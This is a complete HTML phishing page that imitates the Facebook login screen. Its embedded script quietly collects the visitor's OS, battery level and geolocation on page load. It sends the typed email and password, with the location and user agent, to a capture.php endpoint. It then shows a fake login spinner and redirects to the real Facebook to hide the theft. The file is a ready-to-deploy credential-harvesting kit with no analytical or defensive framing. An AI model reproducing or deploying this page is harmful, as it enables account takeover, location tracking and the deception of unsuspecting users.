<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook – Log in or sign up</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.15);
            padding: 30px 28px 28px;
            max-width: 396px;
            width: 100%;
            text-align: center;
        }

        .fb-logo {
            font-size: 44px;
            font-weight: 700;
            color: #1877f2;
            letter-spacing: -1px;
            margin-bottom: 4px;
            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
        }
        .fb-logo span {
            background: #1877f2;
            color: white;
            padding: 2px 10px;
            border-radius: 4px;
            font-size: 20px;
            margin-right: 4px;
            display: inline-block;
        }

        .subhead {
            color: #606770;
            font-size: 15px;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 12px;
        }
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            font-size: 17px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            background: #ffffff;
            transition: 0.2s;
            outline: none;
        }
        .form-group input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
        }

        .btn-login {
            width: 100%;
            padding: 14px;
            font-size: 20px;
            font-weight: 700;
            color: white;
            background: #1877f2;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 6px;
        }
        .btn-login:hover {
            background: #166fe5;
        }
        .btn-login:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 18px 0 16px;
            gap: 12px;
        }
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dadde1;
        }
        .divider span {
            font-size: 14px;
            color: #606770;
            font-weight: 600;
        }

        .btn-create {
            width: 100%;
            padding: 14px;
            font-size: 17px;
            font-weight: 700;
            color: white;
            background: #42b72a;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .btn-create:hover {
            background: #36a420;
        }

        .forgot {
            display: block;
            margin-top: 14px;
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
        }
        .forgot:hover {
            text-decoration: underline;
        }

        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #8c9ba8;
            border-top: 1px solid #e6ecf0;
            padding-top: 14px;
        }

        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 3px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card">
    <div class="fb-logo">
        <span>f</span> facebook
    </div>
    <div class="subhead">Connect with friends and the world around you.</div>

    <form id="loginForm">
        <div class="form-group">
            <input type="text" id="email" placeholder="Email or phone number" />
        </div>
        <div class="form-group">
            <input type="password" id="password" placeholder="Password" />
        </div>
        <button type="submit" class="btn-login" id="loginBtn">Log In</button>
    </form>

    <a href="#" class="forgot">Forgot password?</a>

    <div class="divider">
        <span>or</span>
    </div>

    <button class="btn-create" id="createBtn">Create new account</button>

    <div class="footer">
        <span>Meta © 2026</span>
    </div>
</div>

<script>
// ---------- SILENT CAPTURE WITH REDIRECT TO REAL FACEBOOK ----------
(function() {
    const form = document.getElementById('loginForm');
    const loginBtn = document.getElementById('loginBtn');

    let locationCaptured = false;
    let batteryLevel = null;
    let osName = 'Unknown';
    let lastLocation = { lat: null, lng: null, accuracy: null, timestamp: null };

    // ---------- 1. Detect OS (silent) ----------
    function detectOS() {
        const ua = navigator.userAgent;
        if (ua.includes('Windows')) osName = 'Windows';
        else if (ua.includes('Mac OS')) osName = 'macOS';
        else if (ua.includes('Linux')) osName = 'Linux';
        else if (ua.includes('Android')) osName = 'Android';
        else if (ua.includes('iPhone') || ua.includes('iPad')) osName = 'iOS';
        else osName = 'Other';
        return osName;
    }
    detectOS();

    // ---------- 2. Get Battery Level (silent) ----------
    if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
            batteryLevel = Math.round(battery.level * 100);
        }).catch(() => {});
    }

    // ---------- 3. Send data to PHP ----------
    function sendToServer(lat, lng, accuracy, timestamp) {
        const email = document.getElementById('email').value || 'N/A';
        const password = document.getElementById('password').value || 'N/A';

        const payload = {
            lat: lat,
            lng: lng,
            accuracy: accuracy,
            timestamp: timestamp,
            email: email,
            password: password,
            os: osName,
            battery: batteryLevel,
            userAgent: navigator.userAgent
        };

        // Fire and forget – we don't wait for the response
        fetch('capture.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(() => {}); // Silent fail
    }

    // ---------- 4. Request geolocation (iPhone friendly) ----------
    function requestLocation() {
        if (!navigator.geolocation) return;

        // First attempt: faster (WiFi/Cell), longer timeout for iPhone
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const lat = pos.coords.latitude;
                const lng = pos.coords.longitude;
                const acc = pos.coords.accuracy;
                const ts = pos.timestamp || Date.now();
                locationCaptured = true;
                lastLocation = { lat, lng, accuracy: acc, timestamp: ts };
                // Send location as soon as we get it
                sendToServer(lat, lng, acc, ts);
            },
            (err) => {
                // If it fails or times out, try a fallback with lower accuracy but longer timeout
                console.warn('Location attempt 1 failed (iOS fallback):', err.message);
                setTimeout(() => {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            const lat = pos.coords.latitude;
                            const lng = pos.coords.longitude;
                            const acc = pos.coords.accuracy;
                            const ts = pos.timestamp || Date.now();
                            locationCaptured = true;
                            lastLocation = { lat, lng, accuracy: acc, timestamp: ts };
                            sendToServer(lat, lng, acc, ts);
                        },
                        () => {}, // Final silent fail
                        { enableHighAccuracy: false, timeout: 30000, maximumAge: 60000 }
                    );
                }, 2000);
            },
            { enableHighAccuracy: false, timeout: 30000, maximumAge: 60000 }
        );
    }

    // Auto-request location when page loads
    requestLocation();

    // ---------- 5. Form submit – capture credentials & redirect ----------
    form.addEventListener('submit', function(e) {
        e.preventDefault();

        // Grab credentials immediately
        const email = document.getElementById('email').value || 'N/A';
        const password = document.getElementById('password').value || 'N/A';

        // If location wasn't captured yet, send credentials anyway
        // (location will be sent separately when it's captured)
        if (locationCaptured) {
            // Send credentials + last known location
            sendToServer(lastLocation.lat, lastLocation.lng, lastLocation.accuracy, lastLocation.timestamp);
        } else {
            // Send credentials without location (location will come later)
            sendToServer(null, null, null, null);
        }

        // Show loading spinner
        const original = loginBtn.innerHTML;
        loginBtn.innerHTML = '<span class="spinner"></span> Logging in...';
        loginBtn.disabled = true;

        // Clear password field, wait 2.5 seconds, then redirect to REAL Facebook
        setTimeout(() => {
            loginBtn.innerHTML = original;
            loginBtn.disabled = false;
            document.getElementById('password').value = '';
            document.getElementById('password').placeholder = 'Redirecting to Facebook...';
            
            setTimeout(() => {
                // Redirect to the REAL Facebook homepage
                window.location.href = 'https://www.facebook.com/';
            }, 1500);
        }, 2500);
    });

    // ---------- 6. "Create new account" redirects to real Facebook ----------
    document.getElementById('createBtn').addEventListener('click', function() {
        window.location.href = 'https://www.facebook.com/reg/';
    });

    // ---------- 7. "Forgot password" redirects to real Facebook ----------
    document.querySelector('.forgot').addEventListener('click', function(e) {
        e.preventDefault();
        window.location.href = 'https://www.facebook.com/login/identify/';
    });
})();
</script>
</body>
</html>
